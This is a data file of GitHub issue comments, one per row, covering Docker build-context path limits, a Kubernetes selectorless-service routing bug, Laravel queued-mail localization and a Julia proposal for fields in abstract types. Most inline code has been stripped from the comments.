moby/moby/2745/347054344,2745,"So if I have a dockerfile like this... ... and run a command to publish a new empty Asp.net (not core) web app (dockerfile inside folder) ... ... the  error that crops up (that talks about a path I have specified nowhere) is talking about it from the context of the ""Docker Server"" box in the picture above? I did try changing the COPY to various relative and absolute paths, but nothing stopped producing that that error, or caused a different one to happen. I'm only on this thread as its the only place I could find that had mention of the random temp\docker-builderNNNNNNNN folder that does get created locally on my windows pc (maybe on the Docker Server as well. but I can't tell). The local folder is removed almost immediately. If what I'm describing isnt for the same issue as this very long and meandering thread, please say so and I'll open a new issue. No, because of two things  despite the name of the command I am executing, I'm not compiling anything. I'm deploying something already built to a container to create an image.  It doesnt tell me what the build context is. ""Build context"" is meaningless without some concrete bit of info like the context's path or environment variable or the referenced file paths.  ",,False
moby/moby/2745/347059369,2745,"Well, you're compiling an image. Even though you have already ""built"" a thing you want to put into an image, you have not built an image. Well, errors should not replace documentation.   ",,False
moby/moby/2745/347060474,2745,"I see what you're trying to do. It looks like you have not read the  reference or  help.  You have ARG source specified but you haven't provided an argument for it, so the default value of  kicks in First argument of docker build command is a . You would know what is a build context if you had read how to use  before running this command. The error essentially tells you that there's no  in .  ",,False
moby/moby/2745/347061423,2745,"Also, it looks like you're running Windows containers (native docker server) which do not require VM. This technology is still experimental, so you may experience a bug. ",,False
moby/moby/2745/354538918,2745,"plus one for allowing something like 'COPY ../../src' I'm sorry, but any environment that pushes developers to use so clumsy project structures will never mature and leave the mickey-mouse stage. This is not how successful products evolve and no PR hype can be a saver for long. Docker team, please propose some viable solution. ",,False
moby/moby/2745/354621925,2745,"@friend - I should not need to digest tomes of information just to ""get started"". I already had to get permission to temporarily uninstall antivirus that was interfering with docker. The paths used in the build context shouldn't be somewhere other than where I'm executing the command or the program folders. A common temp location is ok too, but only if it doesn't require additional permissions, which I think is what you are saying this needs. ",,False
moby/moby/2745/355042793,2745,"Super clean and direct and works fine, at least for me ",,False
moby/moby/2745/355085815,2745,"@friend Yes, this is tutorial describes how to set a context directory. Which implies that the problem here is that  is not descriptive enough People should refer to extended description on the website  which it's quite easy to grasp what ""Forbidden path"" really means. It doesn't have anything to do with permissions. @friend Writing Dockerfiles for your project doesn't sound ""get started"" to me. It requires quite an advanced knowledge. Getting started tutorial describes setting up very simple project that doesn't require any prior knowledge. But if you need to setup anything more complex you must know how Docker works. And yes, it requires quite a lot of time to figure out. ",,False
moby/moby/2745/356287437,2745,"When something exists but you are not permitted access to it, it is forbidden. If its not a valid for some other reason, its Invalid for some other reason. I started with the one that is created when adding docker support to a VS project. It would run in a debugger but that isnt very useful if I need to make a deployable image. Trying to use the CLI to build the image outside of VS just reports the temp folder error.  The file looks correct ... ""Docker, build using this folder and the docker file in it."" seems to be what the CLI help tells me this means.  Nothing about a build context or additional paths, just the one path to direct it to, be it a filesystem path, or a URL, or a ""-"" (the dash must be a *nix convention). The command looks correct...  Both the command and the dockerfile look correct, yet it does not work. ",,False
moby/moby/2745/356408224,2745,"In Unix,  usually means ""short help"". If you need extended info you should use   don't see how this problem you have is related to ""Forbidden path"" issue. Error message tells you that there's no folder named  in . Where do you see ""Forbidden path""? ",,False
moby/moby/2745/356502327,2745,"You are applying the word with an incorrect meaning. I don't mean offense, i can only speak in one language and you clearly can communicate in more than one. Personally I would rather be corrected than to continue to speak incorrectly. if  is the short help (that goes on for a few screens worth of console), then what is  ? That usage example says run the executable ""docker"" with command (option) ""build"" and give it a path. And then says ""build an image from a  docker file"". So the path must be to the docker file, yes?  If there are other params required it should say that, not make me look up ""man pages"". I still dont understand why its choosing to use the temp folder and then complaining about it when I gave the path to the docker file as the parameter and that has a relative path in it. ",,False
moby/moby/2745/356505706,2745,♠PATHDockerfile-fPATHobj/Docker/publish` by the look of it. ,,False
moby/moby/2745/356510543,2745,"It doesn't have to use the temp folder, it's just an implementation detail. What really happens is that it uses a remote build. I.e. while physically it's just a different location of the same machine, logically,  doesn't build on your local machine, it builds on the remote machine. So you must provide all the files the build needs inside the directory or tarball specified by PATH or URL so that these files are copied to that remote machine and used to produce an image. This approach is called ""the client/server architecture"". That is also a Unix convention  flags that are composed of one letter are specified using a minus (). They usually have an expanded version that has identical meaning, but longer to type (). This sounds like a valid point. Please create a new issue if you want the  to be changed to be more descriptive. ",,False
moby/moby/2745/357575347,2745,"I hit this all the time with go projects, where it is common for packages to live at the root of the project, and not in the buildable command directory (where i want the Dockerfile to live). I can't build the Dockerfile and use the newest version of the utilities dir if I buil from the  directory. I could of course run  in my Dockerfile, but often times I want to use the local (modified) versions of my packages that are not yet published upstream. Here are the workarounds I've come up with (some seen in this issue) Move Dockerfiles to project root Move your  to the root of your project and re-factor it to add files and directories from the project root path onward (.  Cons Some people have huge projects and Docker uploads the entire ""context"" its running in to whatever the building server is, which is sometimes a remote server over VPN. This is too slow for some people.  Make a temporary dir for outside dependencies Create a  in your  directory that copies in outside dependencies to a temporary directory, then calls .  Refactor your  to add files from the temporary directory created in your  when building.  Have the  then call a clean that deletes the temporary directory.  Cons Your  may break, leaving garbage duplicated files around.  You can make this less of an issue by adding the temporary directory to a  file.  Run Dockerfiles from root context Run your  from the project root ""context"", but let it keep living in the  dir.  Refactor the  to add files relative the root of the project ().  Cons Still does not work with huge repos, that end up shipping the entire project to a remote docker server in some environments.  ",,False
moby/moby/2745/357788920,2745,@friend Read above the recommended option do not use Dockerfile for development. Use go base image + docker-compose + mounted folders. ,,False
moby/moby/2745/365476150,2745,"After 153 comments I would have figured this would be understood as a basic needed feature... using asp.net, the build is based off of a directory. If you're recommending me to have separate csprojects just for a docker build, that is crazy. The official dotnet-core-architecture example shows building outside of docker, then just copying the built contents into a docker container... that can't seriously be the considered way of doing this. ",,False
moby/moby/2745/365513667,2745,"@friend A lot of people confuse docker build and Dockerfile with build scripts. Dockerfile was never intended to be a general purpose build tool. Though you can use Dockerfile this way, you're on your own with it's caveats. Yes, if you want a production image, you should run a container to build your artifacts and then copy these build artifacts to the place where Dockerfile is located or change the context to the directory with your build artifacts. ",,False
moby/moby/2745/365515619,2745,See it this way Dockerfile is a set of instructions to copy your runtime files to an empty docker image. ,,False
moby/moby/2745/365516647,2745,"@friend that's the point of multi-stage builds, correct? If project B references project A, project B won't build, because it expects a csproj reference to to the project, not to a dll reference, even if you get the artifacts of project A, unless you make a separate csproj to reference by compiled dll instead of source, it won't build. And ya, I am confused what you mean ""docker build vs dockerfile with build scripts"". Docker build is for Dockerfile, correct? If not, I don't feel that should be the description on the top of the Docker Build page P ",,False
moby/moby/2745/365534814,2745,"So you're saying you're using csproj files to build multiple projects simultaneously? In this case you need to access all the source files, which is 800 mb in your case. I don't see what you expect. You either build them inside or outside a container. In either case you'll end up with dll and exe files which you then put into an image ",,False
moby/moby/2745/365643858,2745,"I don't understand why this needs to keep being stated... Structure  Libraries --- Library 1 --- Library 2 --- Library 3 APIs --- API 1 - reference library 1 --- API 2 - references library 2 and library 3  If I request API 1to be built, i do NOT need to send library 2, library 3, and API2. I ONLY need Library 1 and API 1. This is a C# project reference &lt;ProjectReference Include=""..\..\..\BuildingBlocks\EventBus\EventBusRabbitMQ\EventBusRabbitMQ.csproj"" /&gt;  Your Options A. Change Project Reference's to local dll's, destroying all intellisense for every library B. Hot-Swap project references to specifically only build for dll as needed for each individual docker build, (hundred of hot swaps, sounds fun) C. Send 800mb per build, when only 2 of those are actually needed D. Don't use Docker for anything build related, one of the main reasons I want to move to docker. E. Fix Docker and make everyone happy. ",,False
moby/moby/2745/365655760,2745,"The daemon still needs to have all files sent. Some options that have been discussed;  Allow specifying a  so that multiple Dockerfiles can use the same build-context, but different paths can be ignored for each Dockerfile ( reverse allow specifying multiple build-contexts to be sent, e.g.   Inside the Dockerfile, those paths could be accessible through (e.g.) ",,False
moby/moby/2745/365665908,2745,"Yes, I was going down the line of the multiple build contexts. That looks beautiful and would love that feature! Didn't see it portraid quite that way but that looks great to me at least ",,False
moby/moby/2745/365675021,2745,"@friend I didn't say so. I said ""don't use Dockefile for anything build related"". You could perfectly use Docker for builds docker-compose run api2` ",,False
moby/moby/2745/365721198,2745,@friend Multiple build context sounds exactly what I am looking for! How soon can we see this feature? ,,False
moby/moby/2745/365737891,2745,"So far it has just been a possible approach that was discussed; it would need a more thorough design, and also be looked at in light of future integration with  (which has tons of improvements over the current builder, so possible has other approaches/solutions for this problem) I can open a separate issue for the proposal for discussion; if design/feature has decided on, contributions are definitely welcome ",,False
moby/moby/2745/379050760,2745,I resolved with a workaround... Created a docker-compose for build and in original docker-compose generate image for production See ,,False
moby/moby/2745/388200973,2745,"I just encountered this issue. I have multiple multiple dockerfiles and a docker-compose housed in one repo that fires up. I've been using an nginx container to proxy my client-side code with the backend, but I am not trying to dockerize the webpack configuration so that it will copy over the code and watch for changes. I've run into this forbidden issue, since my COPY command has to reach into a sibling directory. ",,False
moby/moby/2745/391181540,2745,Opened  with a proposal for multiple build-contexts ,,False
kubernetes/kubernetes/40870/204928954,40870,"Kubernetes version (use ) Environment Google Container Engine, 1.5.2 What happened I created a selectorless service and configured the endpoint to point at the ClusterIP of another service in a different namespace, as described in the documentation   is supported behaviour (""You want to point your service to a service in another Namespace or on another cluster""). Any requests on the External IP of the selectorless service hang. What you expected to happen Requests to be sent to the target service. How to reproduce it (as minimally and precisely as possible) Start this stack Wait for the  service to be allocated an IP, then try to hit it with curl on port 8080 . There is no output. I would expect the output to be 'I am ALPHA'. Anything else we need to know ",,False
kubernetes/kubernetes/40870/277729893,40870,"Hi there, this seems interesting AFAICT, the problem seems to be a mismatch between the docs and what the  in  actually can do. In , the otherwise purely virtual  are realized by smart DNAT-ing on each node in the cluster (done by ). The DNAT rules are more or less the core functionality, and are defined in the NAT table of , on each node, for each existing endpoint of each service in the cluster. From what I can see, the problem in your case is that the DNAT in  is effectively done only once (all the  chains are traversed just once per packet, see here), so that the request to the  service is effectively resolved to a request to  after it comes out of  (i.e. after all  chains are applied). But,  is not a real IP (it's a virtual service IP), and thus your requests fails as it has no real destination. One way to deal with this is to make  recursively resolve the DNAT rules in case there are chained services as in your case, and then sync them with  (the sync is done in real time anyways). Here is a sketch commit of how this can be ""fixed"" in the code (it works in my dev setup). It would be good to hear a second opinion on whether this use case should indeed be supported. In case you are interested, I can open a PR with the fix and try to merge it. ",,False
kubernetes/kubernetes/40870/278325604,40870,"FYI, the service-to-service forwarding chain didn't work in my dev cluster even if both services are in the same namespace (as the problem described above seems to be conceptual). The services being in different namespaces is a whole separate issue on it's own. ",,False
kubernetes/kubernetes/40870/278329384,40870,"Yes, I apologise, I noticed that this functionality doesn't work even in the same namespace while constructing this issue, but did a bad job of removing the references to namespacing. ",,False
kubernetes/kubernetes/40870/281573791,40870,"It's not surprising to me that this doesn't work.  I don't think this particular usage pattern was  tested or even considered really. It's not invalid, but it's a little weird.  Can you use ExternalName instead, to achieve the desired effect? On Thu, Feb 9, 2017 at 453 AM, Michail Kargakis notifications@friend.com wrote ",,False
kubernetes/kubernetes/40870/281621194,40870,"@friend I'm confused, my usage pattern matches exactly what is documented as a use-case for this functionality Please could you describe how my usage pattern is different? I might be able to use , it depends on the TTL, but in my experience using DNS for traffic routing is a bad idea. ",,False
kubernetes/kubernetes/40870/282285295,40870,"instead, to achieve the desired effect? I got this working with ExternalName, just put the FQDN in the externalName property. I'm running on an on-prem cluster running Actually, according to the description in the docs, ExternalName creates a DNS CNAME which, according to wikipedia (my DNS knowledge isn't that great), is This seems to be semantically consistent with what we're doing. ",,False
kubernetes/kubernetes/40870/302793354,40870,"Yeah, IMO we can probably turn this into a documentation issue.  Sounds like the ""feature"" is supported through ExternalName, but the docs don't make it clear how to achieve this. ",,False
kubernetes/kubernetes/40870/353797856,40870,"Issues go stale after 90d of inactivity. Mark the issue as fresh with . Stale issues rot after an additional 30d of inactivity and eventually close. Prevent issues from auto-closing with an  comment. If this issue is safe to close now please do so with . Send feedback to sig-testing, kubernetes/test-infra and/or . /lifecycle stale ",,False
kubernetes/kubernetes/40870/359900118,40870,"Stale issues rot after 30d of inactivity. Mark the issue as fresh with . Rotten issues close after an additional 30d of inactivity. If this issue is safe to close now please do so with . Send feedback to sig-testing, kubernetes/test-infra and/or . /lifecycle rotten /remove-lifecycle stale ",,False
kubernetes/kubernetes/40870/367794750,40870,"Rotten issues close after 30d of inactivity. Reopen the issue with . Mark the issue as fresh with . Send feedback to sig-testing, kubernetes/test-infra and/or fejta. /close ",,False
kubernetes/kubernetes/40870/378644753,40870,"/reopen @friend did you solve this issue? currently the documentation hasn't changed, BTW. see ",,False
kubernetes/kubernetes/40870/378644765,40870,"@friend you can't re-open an issue/PR unless you authored it or you are assigned to it. &lt;details&gt;  In response to [this]( for interacting with me using PR comments are available [here](  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra]( repository. &lt;/details&gt;",,False
kubernetes/kubernetes/40870/378648256,40870,"@friend no, I never managed to get this working as documented. I gave up on this issue as soon as @friend said ""I don't think this particular usage pattern was  tested or even considered really"" when my exact use-case was listed as an example in the documentation (""You want to point your service to a service in another Namespace or on another cluster""). I've encountered enough wontfix attitudes on open source projects to know that pursuing this would exceed the amount of time I have available to finish this work. In the end I used  in TCP mode and configured it with environment variables. ",,False
kubernetes/kubernetes/40870/378649620,40870,@friend thanks -) ,,False
kubernetes/kubernetes/40870/394156860,40870,I created #64668 to clarify if we want this. ,,False
framework/laravel/24848/341262885,24848,"♠ Please use this issue tracker only for reporting Laravel bugs.  If you need support, please use the forums  -   -  you may use Slack ( or Stack Overflow ( you would like to propose new Laravel features, please make a pull request, or open an issue at  Version 5.6  Description Authentication problem due to syntax error. Steps To Reproduce in framework/src/Illuminate/Auth/SessionGuard.php file on line 380 change fromreturn !(is_null($user) &amp;&amp; $this-&gt;provider-&gt;validateCredentials($user, $credentials));` ",,False
framework/laravel/24848/405047098,24848,What's the problem? Your suggestion completely changes the behavior of . ,,False
framework/laravel/24848/405091955,24848,"sorry my bad, this attitude always return true but ♠$this-&gt;provider-&gt;validateCredentials($user, $credentials)` part is always returning false even credentials are true, I couldn't figure it out why ",,False
julia/JuliaLang/4935/23299157,4935,This would look something like Foo` to begin with those fields. Some parts of the language internals already anticipate this; it's a matter of hooking up the syntax and filling in a few missing pieces. ,,False
julia/JuliaLang/4935/29293440,4935,plus one to this ,,False
julia/JuliaLang/4935/29297756,4935,"plus one (!) I'm wondering if the  keyword is useful, necessary, and/or deliberate? ",,False
julia/JuliaLang/4935/29298513,4935,"If he didn't have a  keyword, every declaration of  will need an . Currently  is a oneliner, but  and  is mulitiline until a  marker. ",,False
julia/JuliaLang/4935/29298893,4935,"Right, thanks @friend. ",,False
julia/JuliaLang/4935/29299222,4935,plus one this will be very useful! ,,False
julia/JuliaLang/4935/29306979,4935,"I'd actually be ok with changing  to always require an , although that would make this a breaking change, which it currently isn't. The  thing feels pretty clunky to me and our current  declarations have always felt a little jarringly open-ended to me. ",,False
julia/JuliaLang/4935/29307078,4935,I kind of agree with Stefan. Making the visual appearance of  more like that of  and  seems like a gain to me. ,,False
julia/JuliaLang/4935/29307474,4935,"Yeah, FWIW I was going to say the same. ",,False
julia/JuliaLang/4935/29307526,4935,Fourth-ed ,,False
julia/JuliaLang/4935/29307910,4935,"The big problem with making a syntactic change like that is it's going to become a watershed for all the code out there that declares abstract types, splitting that code into before and after versions. Since half of our community likes to live on the edge while the other half likes to use 0.2 (making up numbers here, but half-and-half seems reasonable), that's kind of a big problem. If there was some way we could deprecate the open-ended abstract type declaration, that would avoid the issue. ",,False
julia/JuliaLang/4935/29308151,4935,"Now that 0.2 is out, I actually think we should tell people not to use master for work that's not focused on the direct development of Julia itself. I intend to only work from 0.2 until the 0.3 release while developing packages. ",,False
julia/JuliaLang/4935/29308488,4935,"Maybe you can hack a temporary thing to end an abstract block if the next line does not start with a field declaration? Backporting this to 0.2.x would allow moving progressively, then you would introduce a deprecation warning, and make it an error with 0.3. ",,False
julia/JuliaLang/4935/29308510,4935,"I think that's very reasonable, although it does cut down on the number of people testing out 0.3, which is unfortunate, but probably unavoidable. ",,False
julia/JuliaLang/4935/29308569,4935,"@friend, yes, I was thinking something along those lines, but it does feel kind of awful. ",,False
julia/JuliaLang/4935/29310595,4935,As a transitioning solution we might update 0.2.1 to allow a  on the same line after . Then in 0.3 we might issue a warning if it is missing and in 0.4 we can require it. That makes this a rather lengthy process though. Why don't we enable inheriting from  and  instead? It keeps the abstract keyword reserved for grouping types. It will also be cleaner if a immutable can't inherit from a type. Will it cause trouble somewhere if we have a abstract and a concrete type with the same name? ,,False
julia/JuliaLang/4935/29311174,4935,"I like the first approach, but it is very, very slow, unfortunately. We definitely cannot allow inheriting from type or immutable. The fact that concrete types are final is crucial. Otherwise when you write  you can't store them inline because someone could subtype  and add more fields, which means that the things in the array might be bigger than 16 bytes. Game over for all numerical work. ",,False
julia/JuliaLang/4935/29313996,4935,"That is a good point. It will be too hard to know if Complex should be interpreted as an abstract or concrete type when it is used as a type parameter. What about this? That does not introduce a new keyword, and is backwards compatible. ",,False
framework/laravel/8392/67853408,8392,"I am looking for a working solution, to translate queued emails. Unfortunately, all emails use the default locale (defined under ). Let's assume, we have two emails in the pipeline, one for an English  user and another for an Japanese  user. What data should I pass to the  facade to translate (localize) the queued emails?   // User model   $user = Userfind(1)-&gt;first();    Mailerqueue($email, 'Party at Batman\'s cave (Batcave)', 'emails.party-invitation', [      ...      'locale' =&gt; $user-&gt;getLocale(), // value ""jp"", but does not work     'lang' =&gt; $user-&gt;getLocale(), // value ""jp"", but does not work     'language' =&gt; $user-&gt;getLocale(), // value ""jp"", but does not work   ]);  ",,False
julia/JuliaLang/4935/29314548,4935,Very nice idea. So far that seems perfect. ,,False
framework/laravel/8392/128326662,8392,A different template for each locale is not a solution... (imagine an application with 10 languages...) There is no way to achieve this? ,,False
framework/laravel/8392/138267835,8392,Why is this issue closed? Is it solved? Is there a way to utilize the locale in queued mails? I think it's really annoying that @friend is closing issues without a proper solution/fix. Imho that doesn't help at all. Keeping this thread open shows that this is still not addressed and needs some solution sooner or later. I would appreciate a solution where it's possible to pass a locale to the queue method. I've also seen suggestions to set the locale via  within the queue callback. But unfortunately that doesn't help either. ,,False
julia/JuliaLang/4935/29314630,4935,"That also potentially allows , which could require all subtypes to be immutable. ",,False
framework/laravel/8392/182380365,8392,plus one this needs to be reopened. ,,False
julia/JuliaLang/4935/29315335,4935,very cool ,,False
framework/laravel/8392/221108801,8392,"It's insanely bad that I can't handle this at all... The only solution I've found is passing the locale to the mail, and then passing it onto the trans() method.. Horribly time consuming and ugly when having +50 templates, and an text only version too. I have to at least do manual labor on plus one00 blade files.. How can it be that even changing language before queue, and inside the closure - does not work..? ",,False
framework/laravel/8392/275922166,8392,I just came across the very same problem. Has this been solved? This is a very essential feature that is overlooked! Anything that is thrown into a queue should pass the original locale own to the job! There is no reason not to. ,,False
julia/JuliaLang/4935/29315529,4935,"Yes, I like that idea. We can also make  allowed – optionally for now – and eventually require the  and make allow leaving out the  like we do with . Or maybe we just leave it the way it is. ",,False
framework/laravel/8392/277189390,8392,"@friend, I really appreciate your tremendous contribution for the community. But your attitude is quite annoying. You act like the guard dog of issues without even allowing a discussion on valid issues (you will probably close this issue now and limit discussion to contributors because I wrote this ;-)). While the Laravel ecosystem is promoting a friendly ""netiquette"" all I see is issues being instantly closed for no good reason. Obviously people are having trouble with this issue 13830 So it doesn't help to tuck it away by closing it. As far as I can see it is not solved and it is a problem for millions of non-English speaking developers. What is the best way to address this issue without the issue being instantly closed? I'd be glad to give it a shot! ",,False
julia/JuliaLang/4935/29316601,4935,I'm unreasonably excited about this ) ,,False
framework/laravel/8392/277195271,8392,"I second that @friend It is quite (very!) annoying that these issues are closed before a sensible discussion on the issue is allowed. @friend what are your thoughts on this? I would suggest developing it along the lines of what was discussed in #13830 and submit a pull request. Hopefully, it will be seen as a welcome ""feature"" and accepted. ",,False
julia/JuliaLang/4935/29317049,4935,New language features are like Christmas. ,,False
framework/laravel/8392/277214323,8392,"This feature request is being discussed on laravel/internals#394 that's the reason that this issue is closed... We use that repo for feature requests, you guys could share your ideas there... 😄 ",,False
framework/laravel/8392/277215343,8392,Perfect! Thanks @friend ,,False
julia/JuliaLang/4935/31301034,4935,more support for this from  doing an amazing job here - i can't believe how far you've got and how good this is...) ,,False
framework/laravel/8392/277216662,8392,Thanks @friend. That's the kind of answer I was hoping for ) ,,False
framework/laravel/8392/283973419,8392,I see discussion is still in progress in related internal issue. Came here with assumption that Carbonnow()-&gt;formatLocalized('%B %Y') is also affected with this issue. ,,False
julia/JuliaLang/4935/31324693,4935,"There is a small question of how to handle constructors with this feature. The obvious thing is for it to behave as if you simply copy &amp; pasted the parent type's fields into the new subtype declaration. However, this creates extra coupling, since changing the parent type can require changes to all subtype code The  constructor has to know about the parent fields. Bug or feature? ",,False
framework/laravel/8392/337201621,8392,"I had the similar problem. Check my StackOverflow answer. The idea is to inherit  class and replace  method, then your Mailables will take care of current locale automatically! ",,False
julia/JuliaLang/4935/31325303,4935,"It's very non-local, which I don't care for. One thought is that the subtype would have to repeat the declaration and match it. I know that's not very DRY but it's an immediate, easy-to-diagnose error when it happens, and it means that the child declaration is completely self-contained. The point of having fields in the abstract type declaration is to allow the compiler to know that anything of that type will have those fields and know what offset they're at so that you can emit efficient generic code for accessing those fields for all things of that type without needing to know the precise subtype. I don't think the feature is really about avoiding typing fields. ",,False
framework/laravel/8392/426187394,8392,I believe this was solved in Laravel 5.6? ,,False
julia/JuliaLang/4935/31325380,4935,Isn't this a natural coupling which you will always have if you change a parent type? Maybe it would be cleaner to have  i.e. the parent has to be the first value for  (and outer constructors as well). ,,False
julia/JuliaLang/4935/31325425,4935,It's an interesting point that all the value is in making sure the fields are there. Avoiding typing them is much less important. ,,False
julia/JuliaLang/4935/31325497,4935,"This occurred to me also, but something about it doesn't quite feel right. ",,False
julia/JuliaLang/4935/31325593,4935,"I like @friend s idea, but the syntax must be improved. There is also the issue that the Parent constructor needs to get a pointer from the child constructor to know where to initialize itself. ",,False
julia/JuliaLang/4935/31325606,4935,I am also not sure which form I like more. Introducing the super constructor for abstract types makes it more complicated. But it provides a better distinction which fields are from the parent and which are from the child. ,,False
julia/JuliaLang/4935/31325733,4935,What does  return? ,,False
julia/JuliaLang/4935/31325842,4935, returns a thing like ?  ,,False
julia/JuliaLang/4935/31325991,4935,But what kind of thing? There are no instances of abstract types (or they wouldn't be abstract) so what type of object does it return? ,,False
julia/JuliaLang/4935/31326017,4935,"I think all this is syntactic sugar and would have do be rewritten into the initially proposed form by the compiler. The  syntax says a little bit more explicit that there is a Parent type nested into the Child type. It still reads like the members would be represented in memory. But again, I am also not sure if this is worth it. The syntax proposed by @friend is also fine and quite natural. ",,False
julia/JuliaLang/4935/31326070,4935,A possibility might be to support simple construction of the Child if Parent has default values for its members. Now Object can be instantiated by in a inner constructor by  or . ,,False
julia/JuliaLang/4935/31326077,4935,"Yeah, that's the thing. It's a thing that looks like a function call but isn't at all, which is why I don't care for it. If you're going to do that, you may as well just write , which is shorter and isn't just pointless syntax. ",,False
julia/JuliaLang/4935/31326160,4935,We don't allow for default values of fields at this point. Constructors can have defaults but fields don't have default values. The idea of allowing  or  won't work because we also allow  to not assign a value to . ,,False
julia/JuliaLang/4935/31326950,4935,"Maybe this is obvious to everyone but it's good if whatever solution is chosen plays nicely with multiple inheritance in the, possibly distant, future. ",,False
julia/JuliaLang/4935/31331606,4935,"multiple inheritance sounds like it would eventually require support for field renaming, which suggests repeating fields.  in that case, could there be a macro that copies the values for the simple case?  so ",,False
julia/JuliaLang/4935/31472992,4935,"About the value of fields in abstract types I think that we should aim higher than to just use this to make sure that the fields are there. To me, it would seem that one of the most useful parts of this would be to let the abstract super type support some given abstraction in a way that the subtypes don't have to know about. It should be possible to change the super type's implementation of that abstraction without having to change the sub types (as long as they only rely on the abstraction, and not the actual inherited fields etc.). Or maybe that it is too much to aim for; there's no way to completely avoid name clashes between fields from the super type and sub types if they don't know about each others' implementations. I guess what we really need to figure out is what kind of usage this feature is meant to support. ",,False
julia/JuliaLang/4935/31489295,4935,I don't think that there are many practicle examples where parent and child type are so loosly coupled that the parent fields can be constructed without feeding them through the child constructor. Thinking more about the syntax for base field initialization I think that it would be very usefull if there would be a way to define an own constructor for the parent type. If base field initialization is non-trivial this would reduce code duplication. It should however be optional to call this parent constructor in the child constructor in order override the default behavior. ,,False
julia/JuliaLang/4935/31497671,4935,"Stop me if I'm getting off on a whole nother topic but how about Type Factory and Static Members. I was thinking of how to make a type to represent Decibels. The frustrating thing is there's many slightly different, related definitions of decibels. I'd like if the datum could carry around which definition of Decibel it was using as part of it's type without having to copy all of the information for each one. For example, one definition of Decibel is dBm Units ""MilliWatts"" Base 10 Scale 10 Reference 1 mW  You convert a quantity,  of MilliWatts to dBm with . But then you also have dBV. It works similarly except Units Volts Base 10 Scale 20 Reference 1 Volt  And so the conversion is . There are literally dozens of such definitions which could easily share code  Type Factory is a function that returns types. I don't think Julia has this. A Static Member is a value associated with the type itself that need not be repeated for each instance. I don't think Julia has this either. But you can imagine type Decibel{T}     static units     static scale     static base     static reference     value end  function decibelfactory(param, units, scale, base, reference)     return Decibel{param}(units, scale, base, reference) end  dBm = decibelfactory(dBm, ""MilliWatts"", 10.0, 10.0, 1.0)  linearize(qDB) = q.scale * log(q.base, q.value/q.reference)  x = dBm(6)  julia&gt; typeof(x) Decibel{dBm}(""MilliWatts"", 10.0, 10.0, 1.0)  julia&gt; linearize(x) 7.781512503836435  ",,False
julia/JuliaLang/4935/31566802,4935,"Early versions of what is now StrPack.jl dynamically created types using a macro, so this is entirely possible to do. ",,False
julia/JuliaLang/4935/31858287,4935,"I guess we can get ""tempted"" to start doing abstract type AbstractParent   x end type Parent &lt; AbstractParent   # x is inherited end  abstract type AbstractChild1 &lt; AbstractParent   # x is inherited   y end type Child1 &lt; AbstractChild1   # x is inherited from parent   # y is inherited end  abstract type AbstractChild2 &lt; AbstractParent   # x is inherited   z end type Child2 &lt; AbstractChild2   # x is inherited from parent   # z is inherited end  to achieve some kind of inheritance from concrete types... ",,False
julia/JuliaLang/4935/31866914,4935,I have asked myself what the difference is between an abstract type with fields and the ability to inherit from a concrete type. It seems they are almost equal but the abstract type with fields needs one trivial concretization. ,,False
julia/JuliaLang/4935/31867492,4935,"They differ in that you can specify fields and collections that only allow that ""trivial concretization"", whereas there is no way to express that when the abstract type and the trivial concretization are condensed to the same thing. ",,False
julia/JuliaLang/4935/31869783,4935,"If you could inherit from concrete types, then I could (1) construct an array of Float64, (2) define a new subtype of Float64, (3) try to store it into the array. We don't want to allow that. Of course that could also be achieved by having some types be ""final"", but we felt it was simpler to make all concrete types final rather than have an extra keyword like that. ",,False
julia/JuliaLang/4935/31870416,4935,"When I first start learning Julia I felt it badly lacked some features (classes, inheritance) I was used to from Python and C++. However, I soon start to love the simple and clean, yet powerful, ways to code in Julia. Now I can't even figure a greater benefit from having abstract fields, apart from constant field offsets for all subtypes, as pointed by @friend. I really like APIs relying only on methods, thus hiding internals and fields. But it seems that the benefit from constant field offset is lost if using methods to access fields. E.g., imagine we read an API with some abstract class like It can lead us to suppose that  will always return filed , allowing inlining, and benefiting from constant offset efficient code for all subtypes, right? Of Course not, e.g. If we have function which takes an array of different values subtypes of A, and iterate over them So either we stick to methods, getting no really advantage from efficient offset access code (thus, no advantage from abstract fields), or we start using fields directly, losing the internals hiding... DISCLAIMER I may be missing something and therefore saying a lot of BS ) ",,False
julia/JuliaLang/4935/31871642,4935,"One could go even further, and point out that overloading  reduces the need for this feature even more, since I can effectively add read-only fields using So fields in abstract types really only add something in the rare case where being able to store some piece of state in a value is part of the interface. ",,False
julia/JuliaLang/4935/31871759,4935,"@friend I totally get that you need to finalize types in order to have unboxed array content. But with this PR on the table it seems to be that this will allow subtyping ""with tricks"" and I wonder if it will get a common pattern to define all methods on the ""almost concrete"" type and then put a trivial concretization on top of that. ",,False
julia/JuliaLang/4935/31872480,4935,"In several cases that already happens (e.g. ), and is fairly common in OO languages generally. If people want to think of concrete types as just a  declaration, that's fine with me. We're happy as long as ""final"" types are possible, and that people are encouraged to use them. ",,False
julia/JuliaLang/4935/31873465,4935,"I am also not totally sure if the lack of inheritance of concrete types is really an issue. The nice thing would be that one inherits all methods of a parent type. But maybe the cleaner solution is to use a ""has a"" relation instead of a ""is a"" relation anyway. But this currently means redefining various methods which feels like a drawback compared to inheritance. ",,False
julia/JuliaLang/4935/31874142,4935,"I am starting to wonder if this feature is really that necessary. It's kind of hard to see what crucial problem it's solving. The main benefits seem to be  Guarantee that  will always work for all subtypes of an abstract type that has . Otherwise someone could define a subtype and forget to have this field, leading to errors. Guarantee that  is stored at a consistent location in all subtypes.  I actually think that 1. might be an argument against this feature if we allowed overloading of  then a subtype could define a getter and/or setter for  instead of actually storing the field and still work fine with the abstract behavior of the super-type. I'm not sure if 2. is actually enough of a benefit to warrant the entire feature. ",,False
julia/JuliaLang/4935/31874312,4935,"In fact, you can imagine a subtype being forced to have a  field but wanting to overriding the  syntax. Then it would be forced to have a vestigial  field that's just wasted and forced on it for no good reason. ",,False
julia/JuliaLang/4935/31874352,4935,"Following up Point 1, part of the appeal of abstract types with fields is that they define a kind of interface you know all subtypes will support. For example, linear regression, logistic regression, SVM's and other models all will have a specific weight vector that you'd like to be sure is available. Whether it's through a field or a function is much less important than checking that the implementation satisfies the stated protocol. ",,False
julia/JuliaLang/4935/31874539,4935,"To that end, I think that having a formalization of protocols/interfaces is much more useful and important than fields for abstract types, which only addresses a tiny portion of this much bigger issue. ",,False
julia/JuliaLang/4935/31874693,4935,I agree that it's much more important. But there is something nice about the minimal typing required when you have a lot of concrete types that are small variants on a parent abstract type that has almost all of the fields that concrete types will need. ,,False
